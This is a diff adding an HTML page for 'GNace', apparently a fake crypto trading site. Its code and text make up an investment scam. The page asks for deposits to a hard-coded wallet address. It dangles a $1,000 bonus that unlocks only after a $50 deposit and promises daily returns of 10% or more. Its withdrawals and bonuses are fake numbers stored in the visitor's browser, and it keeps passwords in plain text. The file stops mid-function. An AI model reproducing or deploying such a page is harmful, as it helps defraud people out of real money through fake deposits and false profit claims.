@@ -1,0 +1,1159 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GNace - Free Crypto Trading Platform</title>
+    <link rel="stylesheet" href="styles.css">
+<style type="text/css" id="dcoder_stylesheet">* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Segoe UI', Arial, sans-serif;
+}
+
+body {
+    color: #d3d3d3; /* Light gray text on black background */
+    position: relative;
+    overflow-x: hidden;
+    background: #000000; /* Black background */
+    line-height: 1.6;
+}
+
+canvas {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    opacity: 0.8;
+}
+
+header {
+    background-color: rgba(0, 0, 0, 0.8); /* Semi-transparent black */
+    color: #d3d3d3; /* Light gray text */
+    padding: 15px;
+    text-align: center;
+}
+
+header h1 {
+    font-size: 2em;
+}
+
+.hero {
+    text-align: center;
+    padding: 30px 15px;
+    background-color: #343a40; /* Dark gray background */
+    margin: 10px;
+    border-radius: 10px;
+}
+
+.hero h2 {
+    font-size: 1.5em;
+    margin-bottom: 15px;
+    color: #007bff; /* Blue headers */
+}
+
+.hero p {
+    font-size: 1em;
+    margin-bottom: 15px;
+    color: #000000; /* Black text on dark gray */
+}
+
+.signup-form {
+    max-width: 100%;
+    margin: 0 auto;
+    padding: 20px; /* Increased padding for better spacing */
+    background: linear-gradient(135deg, #007bff, #28a745); /* Blue-to-green gradient */
+    border-radius: 10px; /* Slightly larger radius for smoother edges */
+    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4); /* Enhanced shadow for depth */
+}
+
+.signup-form h3 {
+    color: #d3d3d3; /* Light gray text */
+    font-size: 1.5em;
+    margin-bottom: 20px;
+}
+
+.signup-form input {
+    width: 100%;
+    padding: 12px; /* Slightly larger padding for better usability */
+    margin: 10px 0;
+    border: 2px solid #007bff; /* Blue border */
+    border-radius: 6px; /* Softer corners */
+    font-size: 1em;
+    background-color: #6c757d; /* Light gray background */
+    color: #000000; /* Black text */
+    transition: border-color 0.3s ease, box-shadow 0.3s ease; /* Smooth transitions */
+}
+
+.signup-form input:focus {
+    border-color: #28a745; /* Green border on focus */
+    box-shadow: 0 0 8px rgba(40, 167, 69, 0.5); /* Green glow on focus */
+    outline: none;
+}
+
+.signup-form input::placeholder {
+    color: #d3d3d3; /* Light gray placeholder text */
+}
+
+.signup-form button {
+    width: 100%;
+    padding: 12px;
+    background-color: #28a745; /* Green button */
+    color: #d3d3d3; /* Light gray text */
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 1em;
+    transition: background-color 0.3s ease, transform 0.2s ease; /* Smooth hover and click effect */
+}
+
+.signup-form button:hover {
+    background-color: #0056b3; /* Blue hover effect */
+    transform: scale(1.02); /* Slight scale-up on hover */
+}
+
+.signup-form a {
+    color: #17a2b8; /* Teal link */
+    text-decoration: none;
+}
+
+.signup-form a:hover {
+    color: #138496; /* Darker teal on hover */
+}
+
+.signup-form p {
+    color: #d3d3d3; /* Light gray text */
+    font-size: 0.9em;
+    margin-top: 10px;
+}
+
+.market-data {
+    padding: 30px 15px;
+    text-align: center;
+    background-color: #343a40; /* Dark gray background */
+    margin: 10px;
+    border-radius: 10px;
+}
+
+.market-data h2 {
+    font-size: 1.5em;
+    margin-bottom: 15px;
+    color: #007bff; /* Blue headers */
+}
+
+.market-grid {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    flex-wrap: wrap;
+}
+
+.market-item {
+    background-color: #343a40; /* Dark gray background */
+    padding: 15px;
+    width: 100%;
+    max-width: 250px;
+    border-radius: 8px;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+    transition: transform 0.3s ease;
+}
+
+.market-item:hover {
+    transform: translateY(-5px);
+}
+
+.market-item h3 {
+    color: #007bff; /* Blue headers */
+}
+
+.market-item p {
+    color: #000000; /* Black text on dark gray */
+}
+
+.dashboard {
+    display: none;
+    padding: 30px 15px;
+    text-align: center;
+    background-color: #343a40; /* Dark gray background */
+    margin: 10px;
+    border-radius: 10px;
+}
+
+.dashboard h2 {
+    font-size: 1.5em;
+    margin-bottom: 15px;
+    color: #007bff; /* Blue headers */
+}
+
+.dashboard-grid {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    flex-wrap: wrap;
+}
+
+.dashboard-item {
+    background-color: #343a40; /* Dark gray background */
+    padding: 15px;
+    width: 100%;
+    max-width: 300px;
+    border-radius: 8px;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+}
+
+.dashboard-item input {
+    width: 100%;
+    padding: 10px;
+    margin: 8px 0;
+    border: 1px solid #6c757d; /* Light gray border */
+    border-radius: 4px;
+    font-size: 1em;
+    background-color: #6c757d; /* Light gray background */
+    color: #000000; /* Black text */
+}
+
+.dashboard-item button {
+    width: 100%;
+    padding: 10px;
+    background-color: #28a745; /* Green button */
+    color: #d3d3d3; /* Light gray text */
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+
+.dashboard-item button:hover {
+    background-color: #218838; /* Darker green on hover */
+}
+
+.balance-actions {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 10px;
+}
+
+.balance-actions span {
+    font-size: 1.2em;
+    font-weight: bold;
+    color: #000000; /* Black text */
+}
+
+.balance-actions button {
+    padding: 8px 12px;
+    background-color: #17a2b8; /* Teal button */
+    color: #d3d3d3; /* Light gray text */
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 1em;
+    transition: background-color 0.3s ease;
+}
+
+.balance-actions button:hover {
+    background-color: #138496; /* Darker teal on hover */
+}
+
+.free-offer {
+    background: linear-gradient(135deg, #28a745, #218838); /* Green gradient */
+    padding: 15px;
+    border-radius: 8px;
+    color: #d3d3d3; /* Light gray text */
+    text-align: center;
+    margin-bottom: 15px;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+}
+
+.free-offer h3 {
+    font-size: 1.5em;
+    margin-bottom: 10px;
+}
+
+.free-offer button {
+    background-color: #17a2b8; /* Teal button */
+    color: #d3d3d3; /* Light gray text */
+    padding: 10px 20px;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 1em;
+    transition: background-color 0.3s ease;
+}
+
+.free-offer button:hover {
+    background-color: #138496; /* Darker teal on hover */
+}
+
+.popup {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: #343a40; /* Dark gray background */
+    padding: 15px;
+    border-radius: 8px;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+    z-index: 1000;
+    max-width: 90%;
+    width: 300px;
+    text-align: center;
+    color: #000000; /* Black text */
+}
+
+.popup input, .popup select {
+    width: 100%;
+    padding: 10px;
+    margin: 8px 0;
+    border: 1px solid #6c757d; /* Light gray border */
+    border-radius: 4px;
+    font-size: 1em;
+    background-color: #6c757d; /* Light gray background */
+    color: #000000; /* Black text */
+}
+
+.popup button {
+    width: 100%;
+    padding: 10px;
+    background-color: #28a745; /* Green button */
+    color: #d3d3d3; /* Light gray text */
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+
+.popup button:hover {
+    background-color: #218838; /* Darker green on hover */
+}
+
+.review-popup {
+    background: linear-gradient(135deg, #28a745, #218838); /* Green gradient */
+    color: #d3d3d3; /* Light gray text */
+}
+
+.withdraw-review-popup {
+    background: linear-gradient(135deg, #28a745, #218838); /* Green gradient */
+    color: #d3d3d3; /* Light gray text */
+}
+
+.popup table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 10px 0;
+}
+
+.popup table th, .popup table td {
+    padding: 8px;
+    border: 1px solid #6c757d; /* Light gray border */
+    font-size: 0.9em;
+    color: #000000; /* Black text */
+}
+
+.popup table th {
+    background-color: #6c757d; /* Light gray background */
+    color: #000000; /* Black text */
+}
+
+.feature-list {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+}
+
+.feature-list button {
+    width: 100%;
+    padding: 10px;
+    background-color: #17a2b8; /* Teal button */
+    color: #d3d3d3; /* Light gray text */
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+
+.feature-list button:hover {
+    background-color: #138496; /* Darker teal on hover */
+}
+
+.investment-tiers {
+    background-color: #343a40; /* Dark gray background */
+    padding: 15px;
+    border-radius: 8px;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+    margin-top: 15px;
+}
+
+.investment-tiers h3 {
+    font-size: 1.3em;
+    margin-bottom: 10px;
+    color: #007bff; /* Blue headers */
+}
+
+.investment-tiers ul {
+    list-style: none;
+    text-align: left;
+    color: #000000; /* Black text */
+}
+
+.investment-tiers li {
+    margin: 8px 0;
+}
+
+.investment-tiers button {
+    width: 100%;
+    padding: 10px;
+    background-color: #17a2b8; /* Teal button */
+    color: #d3d3d3; /* Light gray text */
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+
+.investment-tiers button:hover {
+    background-color: #138496; /* Darker teal on hover */
+}
+
+.features {
+    padding: 30px 15px;
+    text-align: center;
+    background-color: #343a40; /* Dark gray background */
+    margin: 10px;
+    border-radius: 10px;
+}
+
+.features h2 {
+    font-size: 1.5em;
+    margin-bottom: 15px;
+    color: #007bff; /* Blue headers */
+}
+
+.feature-grid {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    flex-wrap: wrap;
+}
+
+.feature {
+    background-color: #343a40; /* Dark gray background */
+    padding: 15px;
+    width: 100%;
+    max-width: 250px;
+    border-radius: 8px;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+}
+
+.feature h3 {
+    color: #007bff; /* Blue headers */
+}
+
+.feature p {
+    color: #000000; /* Black text */
+}
+
+.legal {
+    padding: 15px;
+    text-align: center;
+    background-color: #343a40; /* Dark gray background */
+    margin: 10px;
+    border-radius: 10px;
+}
+
+footer {
+    background-color: rgba(0, 0, 0, 0.8); /* Semi-transparent black */
+    color: #d3d3d3; /* Light gray text */
+    text-align: center;
+    padding: 15px;
+    margin-top: 10px;
+}
+
+/* Mobile Responsiveness */
+@media (max-width: 480px) {
+    header h1 {
+        font-size: 1.5em;
+    }
+
+    .hero h2, .market-data h2, .dashboard h2, .features h2 {
+        font-size: 1.2em;
+    }
+
+    .hero, .market-data, .dashboard, .features, .legal {
+        padding: 15px;
+        margin: 5px;
+    }
+
+    .signup-form, .market-item, .dashboard-item, .feature {
+        padding: 10px;
+    }
+
+    .signup-form input, .dashboard-item input, .popup input, .popup select {
+        padding: 8px;
+        margin: 6px 0;
+    }
+
+    .signup-form button, .dashboard-item button, .popup button, .investment-tiers button {
+        padding: 8px;
+        font-size: 0.9em;
+    }
+
+    .balance-actions {
+        flex-direction: column;
+        gap: 5px;
+    }
+
+    .balance-actions button {
+        width: 100%;
+        padding: 10px;
+    }
+
+    .free-offer h3 {
+        font-size: 1.2em;
+    }
+
+    .investment-tiers h3 {
+        font-size: 1.1em;
+    }
+
+    .investment-tiers li {
+        margin: 5px 0;
+    }
+
+    .popup table th, .popup table td {
+        padding: 5px;
+        font-size: 0.8em;
+    }
+}</style></head>
+<body>
+    <canvas id="particleCanvas"></canvas>
+
+    <header>
+        <h1>GNace</h1>
+        <p>Your Free Crypto Trading Platform</p>
+    </header>
+
+    <section class="hero" id="hero">
+        <h2>Welcome to GNace</h2>
+        <p>Sign up for free to trade cryptocurrencies like BNB, PI, and USDT, and claim your $1,000 bonus after a $50 deposit!</p>
+        <div class="signup-form">
+            <h3>Sign Up for Free</h3>
+            <input type="text" placeholder="Full Name" id="name" required>
+            <input type="email" placeholder="Email Address" id="email" required>
+            <input type="password" placeholder="Password" id="password" required>
+            <button onclick="showDashboard()">Create Free Account</button>
+            <p>or <a href="#" onclick="showLoginPopup()">Login</a></p>
+            <p>Verify your account with a wallet address to claim bonuses.</p>
+        </div>
+    </section>
+
+    <section class="market-data" id="marketData">
+        <h2>Market Trends</h2>
+        <div class="market-grid">
+            <div class="market-item">
+                <h3>Binance Coin (BNB)</h3>
+                <p>Price: ~$600 (Stable)</p>
+                <p>Trend: Strong due to Binance's ecosystem.</p>
+            </div>
+            <div class="market-item">
+                <h3>Pi Coin (PI)</h3>
+                <p>Price: $1.07 (Up 48.65%)</p>
+                <p>Trend: Volatile after mainnet launch.</p>
+            </div>
+            <div class="market-item">
+                <h3>Tether (USDT)</h3>
+                <p>Price: ~$1.00 (Stable)</p>
+                <p>Trend: Shifting to BUSD/USDC.</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="dashboard" id="dashboard">
+        <h2>Your GNace Dashboard</h2>
+        <div class="free-offer">
+            <h3>Get Free $1,000!</h3>
+            <p>Claim your bonus now. Requires a $50 deposit to withdraw. Subject to verification.</p>
+            <button onclick="showBonusPopup()">Claim Bonus</button>
+        </div>
+        <div class="dashboard-grid">
+            <div class="dashboard-item">
+                <h3>Profile Overview</h3>
+                <div class="balance-actions">
+                    <span id="balance">Balance: $0</span>
+                    <button onclick="showDepositPopup()">+</button>
+                    <button onclick="showWithdrawPopup()">Withdraw</button>
+                </div>
+                <p id="profileName">Name: [Your Name]</p>
+                <p id="profileEmail">Email: [Your Email]</p>
+                <p id="accountStatus">Account Status: Unverified</p>
+                <input type="text" placeholder="Verify with Wallet Address" id="verifyWallet">
+                <button onclick="verifyAccount()">Verify Account</button>
+            </div>
+            <div class="dashboard-item">
+                <h3>Manage Wallet Address</h3>
+                <input type="text" placeholder="Enter Crypto Wallet Address" id="walletAddress">
+                <button onclick="saveWallet()">Save Address</button>
+                <p id="currentAddress">Current Address: None</p>
+            </div>
+            <div class="dashboard-item">
+                <h3>Market Snapshot</h3>
+                <p>BNB: ~$600 (Stable)</p>
+                <p>PI: $1.07 (Up 48.65%)</p>
+                <p>USDT: ~$1.00 (Stable)</p>
+            </div>
+            <div class="dashboard-item">
+                <h3>More Features</h3>
+                <div class="feature-list">
+                    <button onclick="showPortfolio()">Portfolio Tracking</button>
+                    <button onclick="showTradingHistory()">Trading History</button>
+                    <button onclick="showPriceAlertPopup()">Set Price Alert</button>
+                </div>
+            </div>
+        </div>
+        <div class="investment-tiers">
+            <h3>Investment Rewards</h3>
+            <ul>
+                <li><button onclick="invest(50)">Invest $50, get $5/day</button></li>
+                <li><button onclick="invest(100)">Invest $100, get $12/day</button></li>
+                <li><button onclick="invest(250)">Invest $250, get $30/day</button></li>
+                <li><button onclick="invest(500)">Invest $500, get $60/day</button></li>
+                <li><button onclick="invest(1000)">Invest $1,000, get $125/day</button></li>
+                <li><button onclick="invest(5000)">Invest $5,000, get $650/day</button></li>
+            </ul>
+        </div>
+    </section>
+
+    <div class="popup" id="depositPopup">
+        <h3>Fund Your Account</h3>
+        <p>How much do you want to deposit?</p>
+        <input type="number" placeholder="Enter amount (e.g., 50)" id="depositAmount" min="1">
+        <button onclick="showWallet()">Proceed</button>
+    </div>
+
+    <div class="popup" id="walletPopup">
+        <h3>Send Payment</h3>
+        <p>Send <span id="depositAmountDisplay">$0</span> to this wallet address:</p>
+        <p style="word-break: break-all; font-weight: bold;">TQZjDzNyZRuoxTij3JU1ZrAKh3gFMkg1pE</p>
+        <button onclick="confirmDeposit()">Done</button>
+    </div>
+
+    <div class="popup review-popup" id="reviewPopup">
+        <h3>Deposit Submitted</h3>
+        <p>Wait for review in less than 24 hours. It will be added to your balance. Contact: gnace@gmail.com</p>
+        <button onclick="closePopup('reviewPopup')">OK</button>
+    </div>
+
+    <div class="popup" id="withdrawPopup">
+        <h3>Withdraw Funds</h3>
+        <p>Enter amount to withdraw and your crypto wallet address:</p>
+        <input type="number" placeholder="Amount (e.g., 50)" id="withdrawAmount" min="1">
+        <input type="text" placeholder="Crypto Wallet Address" id="withdrawWallet">
+        <button onclick="confirmWithdraw()">Send</button>
+    </div>
+
+    <div class="popup withdraw-review-popup" id="withdrawReviewPopup">
+        <h3>Withdrawal Submitted</h3>
+        <p>It has been withdrawn successfully. Wait for review in 24hrs. If not, contact gnace@gmail.com</p>
+        <button onclick="closePopup('withdrawReviewPopup')">OK</button>
+    </div>
+
+    <div class="popup" id="loginPopup">
+        <h3>Login</h3>
+        <input type="email" placeholder="Email Address" id="loginEmail" required>
+        <input type="password" placeholder="Password" id="loginPassword" required>
+        <button onclick="login()">Login</button>
+    </div>
+
+    <div class="popup" id="bonusPopup">
+        <h3>Enter Wallet Address</h3>
+        <p>Provide your crypto wallet address to receive your $1,000 bonus. Requires a $50 deposit to withdraw.</p>
+        <input type="text" placeholder="Crypto Wallet Address" id="bonusWallet">
+        <button onclick="sendBonus()">Send</button>
+    </div>
+
+    <div class="popup" id="portfolioPopup">
+        <h3>Portfolio Tracking</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>Asset</th>
+                    <th>Amount</th>
+                    <th>Value</th>
+                </tr>
+            </thead>
+            <tbody id="portfolioTable">
+                <tr>
+                    <td>BNB</td>
+                    <td>0</td>
+                    <td>$0</td>
+                </tr>
+                <tr>
+                    <td>PI</td>
+                    <td>0</td>
+                    <td>$0</td>
+                </tr>
+                <tr>
+                    <td>USDT</td>
+                    <td>0</td>
+                    <td>$0</td>
+                </tr>
+            </tbody>
+        </table>
+        <button onclick="closePopup('portfolioPopup')">Close</button>
+    </div>
+
+    <div class="popup" id="tradingHistoryPopup">
+        <h3>Trading History</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th>Date</th>
+                    <th>Action</th>
+                    <th>Asset</th>
+                    <th>Amount</th>
+                    <th>Price</th>
+                </tr>
+            </thead>
+            <tbody id="tradingHistoryTable">
+                <!-- Populated by JavaScript -->
+            </tbody>
+        </table>
+        <button onclick="closePopup('tradingHistoryPopup')">Close</button>
+    </div>
+
+    <div class="popup" id="priceAlertPopup">
+        <h3>Set Price Alert</h3>
+        <select id="alertCoin">
+            <option value="BNB">BNB</option>
+            <option value="PI">PI</option>
+            <option value="USDT">USDT</option>
+        </select>
+        <input type="number" placeholder="Target Price (e.g., 650)" id="alertPrice" min="0">
+        <button onclick="setPriceAlert()">Set Alert</button>
+        <button onclick="closePopup('priceAlertPopup')">Close</button>
+    </div>
+
+    <section class="features" id="features">
+        <h2>Why Choose GNace?</h2>
+        <div class="feature-grid">
+            <div class="feature">
+                <h3>Free Signup</h3>
+                <p>Join without any costs, with optional bonuses.</p>
+            </div>
+            <div class="feature">
+                <h3>Secure Platform</h3>
+                <p>Encryption and cold storage for your funds.</p>
+            </div>
+            <div class="feature">
+                <h3>Easy Verification</h3>
+                <p>Verify your account with a wallet address.</p>
+            </div>
+            <div class="feature">
+                <h3>Exclusive Bonuses</h3>
+                <p>Claim rewards like the $1,000 bonus after a $50 deposit.</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="legal" id="legal">
+        <h2>Legal Notice</h2>
+        <p>GNace is a demo platform for cryptocurrency trading. Bonuses and rewards are subject to verification and a minimum $50 deposit for withdrawals. Contact support@gnace.com for inquiries.</p>
+        <p>Risk Warning: Cryptocurrency trading and investments carry high risk. GNace does not guarantee returns. Verify all wallet addresses before transactions.</p>
+    </section>
+
+    <footer>
+        <p>© 2025 GNace. All rights reserved.</p>
+    </footer>
+
+    <script src="script.js"></script>
+
+<script type="text/javascript" id="dcoder_script">// Particle Background
+const canvas = document.getElementById('particleCanvas');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+const particles = [];
+const particleCount = 100;
+
+class Particle {
+    constructor() {
+        this.x = Math.random() * canvas.width;
+        this.y = Math.random() * canvas.height;
+        this.size = Math.random() * 5 + 1;
+        this.speedX = Math.random() * 3 - 1.5;
+        this.speedY = Math.random() * 3 - 1.5;
+    }
+
+    update() {
+        this.x += this.speedX;
+        this.y += this.speedY;
+        if (this.size > 0.2) this.size -= 0.1;
+        if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
+        if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
+    }
+
+    draw() {
+        ctx.fillStyle = '#d3d3d3'; /* Light gray particles */
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+        ctx.fill();
+    }
+}
+
+function initParticles() {
+    for (let i = 0; i < particleCount; i++) {
+        particles.push(new Particle());
+    }
+}
+
+function animateParticles() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    particles.forEach((particle, index) => {
+        particle.update();
+        particle.draw();
+        if (particle.size <= 0.2) {
+            particles.splice(index, 1);
+            particles.push(new Particle());
+        }
+    });
+    requestAnimationFrame(animateParticles);
+}
+
+initParticles();
+animateParticles();
+
+window.addEventListener('resize', () => {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+});
+
+// Load from localStorage on page load
+let balance = parseFloat(localStorage.getItem('balance')) || 0;
+let hasDeposited50 = localStorage.getItem('hasDeposited50') === 'true';
+let dailyReturns = parseFloat(localStorage.getItem('dailyReturns')) || 0;
+let portfolio = JSON.parse(localStorage.getItem('portfolio')) || { BNB: 0, PI: 0, USDT: 0 };
+const prices = { BNB: 600, PI: 1.07, USDT: 1 };
+let tradingHistory = JSON.parse(localStorage.getItem('tradingHistory')) || [];
+let lastReturnTime = localStorage.getItem('lastReturnTime') || null;
+let walletAddress = localStorage.getItem('walletAddress') || null;
+let userDetails = JSON.parse(localStorage.getItem('userDetails')) || { name: '', email: '', password: '' };
+
+document.getElementById('balance').textContent = `Balance: $${balance}`;
+document.getElementById('currentAddress').textContent = `Current Address: ${walletAddress || 'None'}`;
+if (walletAddress) document.getElementById('accountStatus').textContent = 'Account Status: Verified';
+
+// Load signup details if available
+if (userDetails.name && userDetails.email) {
+    document.getElementById('profileName').textContent = `Name: ${userDetails.name}`;
+    document.getElementById('profileEmail').textContent = `Email: ${userDetails.email}`;
+    document.getElementById('name').value = userDetails.name;
+    document.getElementById('email').value = userDetails.email;
+    document.getElementById('password').value = userDetails.password;
+}
+
+// Dashboard Functions
+function showDashboard() {
+    const name = document.getElementById('name').value;
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    if (name && email && password) {
+        userDetails = { name, email, password };
+        document.getElementById('hero').style.display = 'none';
+        document.getElementById('marketData').style.display = 'none';
+        document.getElementById('features').style.display = 'none';
+        document.getElementById('legal').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+        document.getElementById('profileName').textContent = `Name: ${name}`;
+        document.getElementById('profileEmail').textContent = `Email: ${email}`;
+        alert('Welcome to your GNace Dashboard!');
+        saveToLocalStorage();
+    } else {
+        alert('Please fill out all fields.');
+    }
+}
+
+function verifyAccount() {
+    const wallet = document.getElementById('verifyWallet').value;
+    if (wallet) {
+        walletAddress = wallet;
+        document.getElementById('accountStatus').textContent = 'Account Status: Verified';
+        document.getElementById('currentAddress').textContent = `Current Address: ${walletAddress}`;
+        document.getElementById('verifyWallet').value = '';
+        saveToLocalStorage();
+    } else {
+        alert('Please enter a wallet address to verify your account.');
+    }
+}
+
+function showDepositPopup() {
+    document.getElementById('depositPopup').style.display = 'block';
+}
+
+function showWallet() {
+    const amount = document.getElementById('depositAmount').value;
+    if (amount && amount > 0) {
+        document.getElementById('depositPopup').style.display = 'none';
+        document.getElementById('walletPopup').style.display = 'block';
+        document.getElementById('depositAmountDisplay').textContent = `$${amount}`;
+    } else {
+        alert('Please enter a valid deposit amount.');
+    }
+}
+
+function confirmDeposit() {
+    const amount = parseFloat(document.getElementById('depositAmount').value);
+    if (amount >= 50) {
+        hasDeposited50 = true;
+        // Simulate redirect to payment page
+        alert(`Please send $${amount} to wallet address: TQZjDzNyZRuoxTij3JU1ZrAKh3gFMkg1pE. After payment, wait for review. Contact: gnace@gmail.com`);
+    }
+    document.getElementById('walletPopup').style.display = 'none';
+    document.getElementById('depositAmount').value = '';
+    document.getElementById('reviewPopup').style.display = 'block';
+    applyDailyReturns();
+    saveToLocalStorage();
+}
+
+function showWithdrawPopup() {
+    document.getElementById('withdrawPopup').style.display = 'block';
+}
+
+function confirmWithdraw() {
+    const amount = parseFloat(document.getElementById('withdrawAmount').value);
+    const wallet = document.getElementById('withdrawWallet').value;
+    if (amount && wallet && amount <= balance) {
+        if (!hasDeposited50) {
+            alert('You must deposit at least $50 before you can withdraw.');
+            document.getElementById('withdrawPopup').style.display = 'none';
+            return;
+        }
+        balance -= amount;
+        document.getElementById('balance').textContent = `Balance: $${balance}`;
+        document.getElementById('withdrawPopup').style.display = 'none';
+        document.getElementById('withdrawAmount').value = '';
+        document.getElementById('withdrawWallet').value = '';
+        document.getElementById('withdrawReviewPopup').style.display = 'block';
+        saveToLocalStorage();
+    } else {
+        alert('Invalid amount or insufficient balance. Please enter a valid amount and wallet address.');
+    }
+}
+
+function showBonusPopup() {
+    const status = document.getElementById('accountStatus').textContent;
+    if (status !== 'Account Status: Verified') {
+        alert('Please verify your account with a wallet address first.');
+        return;
+    }
+    document.getElementById('bonusPopup').style.display = 'block';
+}
+
+function sendBonus() {
+    const wallet = document.getElementById('bonusWallet').value;
+    if (wallet) {
+        balance += 1000;
+        document.getElementById('balance').textContent = `Balance: $${balance}`;
+        alert(`Successfully sent $1,000 to ${wallet}! Check your wallet. Requires a $50 deposit to withdraw.`);
+        document.getElementById('bonusPopup').style.display = 'none';
+        document.getElementById('bonusWallet').value = '';
+        saveToLocalStorage();
+    } else {
+        alert('Please enter a wallet address.');
+    }
+}
+
+function saveWallet() {
+    const wallet = document.getElementById('walletAddress').value;
+    if (wallet) {
+        walletAddress = wallet;
+        document.getElementById('currentAddress').textContent = `Current Address: ${walletAddress}`;
+        saveToLocalStorage();
+    } else {
+        alert('Please enter a wallet address.');
+    }
+}
+
+function invest(amount) {
+    showDepositPopup();
+    document.getElementById('depositAmount').value = amount;
+    showWallet();
+    const dailyReturn = getDailyReturn(amount);
+    dailyReturns = dailyReturn;
+    applyDailyReturns();
+    saveToLocalStorage();
+}
+
+function getDailyReturn(amount) {
+    const tiers = [
+        { amount: 50, return: 5 },
+        { amount: 100, return: 12 },
+        { amount: 250, return: 30 },
+        { amount: 500, return: 60 },
+        { amount: 1000, return: 125 },
+        { amount: 5000, return: 650 }
+    ];
+    const tier = tiers.find(t => t.amount === amount);
+    return tier ? tier.return : 0;
+}
+
+function applyDailyReturns() {
+    if (dailyReturns > 0 && !lastReturnTime) {
+        lastReturnTime = new Date().toISOString();
+        saveToLocalStorage();
+    }
+    if (dailyReturns > 0) {
+        const now = new Date();
+        if (lastReturnTime) {
+            const lastTime = new Date(lastReturnTime);
+            const diffMs = now - lastTime;
+            const diffHours = diffMs / (1000 * 60 * 60);
+            if (diffHours >= 24) {
+                balance += dailyReturns;
+                document.getElementById('balance').textContent = `Balance: $${balance}`;
+                alert(`Added $${dailyReturns} to your balance as daily return!`);
+                lastReturnTime = now.toISOString();
+                saveToLocalStorage();
+            }
+        }
+        setTimeout(applyDailyReturns, 1000); // Check every second
+    }
+}
+
+function showPortfolio() {
+    const tbody = document.getElementById('portfolioTable');
+    tbody.innerHTML = `
+        <tr>
+            <td>BNB</td>
+            <td>${portfolio.BNB}</td>
+            <td>$${portfolio.BNB * prices.BNB}</td>
+        </tr>
+        <tr>
+            <td>PI</td>
+            <td>${portfolio.PI}</td>
+            <td>$${portfolio.PI * prices.PI}</td>
+        </tr>
+        <tr>
+            <td>USDT</td>
+            <td>${portfolio.USDT}</td>
+            <td>$${portfolio.USDT * prices.USDT}</td>
+        </tr>
+    `;
+    document.getElementById('portfolioPopup').style.display = 'block';
+}
+
+function showTradingHistory() {
+    const tbody = document.getElementById('tradingHistoryTable');
+    tbody.innerHTML = tradingHistory.length ? tradingHistory.map(trade => `
+        <tr>
+            <td>${trade.date}</td>
+            <td>${trade.action}</td>
+            <td>${trade.asset}</td>
+            <td>${trade.amount}</td>
+            <td>$${trade.price}</td>
+        </tr>
+    `).join('') : '<tr><td colspan="5">No trades yet.</td></tr>';
+    document.getElementById('tradingHistoryPopup').style.display = 'block';
+}
+
+function showPriceAlertPopup() {
+    document.getElementById('priceAlertPopup').style.display = 'block';
+}
+
+function setPriceAlert() {
+    const coin = document.getElementById('alertCoin').value;
+    const targetPrice = parseFloat(document.getElementById('alertPrice').value);
+    if (targetPrice > 0) {
+        alert(`Price alert set for ${coin} at $${targetPrice}.`);
+        setTimeout(() => {
+            alert(`${coin} has reached $${targetPrice}!`);
+        }, 5000); // Simulate alert after 5 seconds
+        document.getElementById('priceAlertPopup').style.display = 'none';
+        document.getElementById('alertPrice').value = '';
+    } else {
+        alert('Please enter a valid target price.');
+    }
+}
+
+function closePopup(popupId) {
+    document.getElementById(popupId).style.display = 'none';
+}
+
+function showLoginPopup() {
+    document.getElementById('loginPopup').style.display = 'block';
+}
+
+function login() {
+    const email = document.getElementById('loginEmail').value;
+    const password = document.getElementById('loginPassword').value;
+    if (email && password) {
+        if (email === userDetails.email && password === userDetails.password) {
+            document.getElementById('currentAddress').textContent = `Current Address: ${walletAddress || 'None'}`;
+            document.getElementById('accountStatus').textContent = walletAddress ? 'Account Status: Verified' : 'Account Status: Unverified';
+            document.getElementById('profileName').textContent = `Name: ${userDetails.name}`;
+            document.getElementById('profileEmail').textContent = `Email: ${userDetails.email}`;
+            document.getElementById('loginPopup').style.display = 'none';
+            document.getElementById('loginEmail').value = '';
+            document.getElementById('loginPassword').value = '';
+            showDashboard();
+        } else {
+            alert('Invalid email or password. Please try again.');
+        }
+    } else {
+        alert('Please enter both email and password.');
+    }
+}
+
+// Simulate a trade for testing (e.g., buying assets)
+function simulateTrade(action, asset, amount, price) {
+    if (action === 'Buy') {
+        const cost = amount * price;
+        if (cost <= balance) {
